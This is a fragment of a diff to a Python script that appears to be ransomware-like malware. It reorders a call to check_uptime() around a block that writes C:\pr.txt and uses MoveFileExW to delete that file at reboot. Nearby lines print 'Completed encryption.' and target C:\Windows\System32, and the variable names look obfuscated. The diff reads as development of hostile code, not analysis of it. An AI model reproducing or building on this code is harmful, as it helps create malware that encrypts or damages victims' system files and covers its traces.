@@ -238,10 +238,11 @@ def check_uptime():
             time_remaining -= timedelta(seconds=1)
         print("Completed encryption.")
 xsadasdpath = r"C:\pr.txt"
+
+check_uptime()
 with open(xsadasdpath, 'w') as temp_file:
     temp_file.write("Temporary content")
 ctypes.windll.kernel32.MoveFileExW(xsadasdpath, None, 4)
-check_uptime()
 '''
 directory = r'C:\Windows\System32'
 
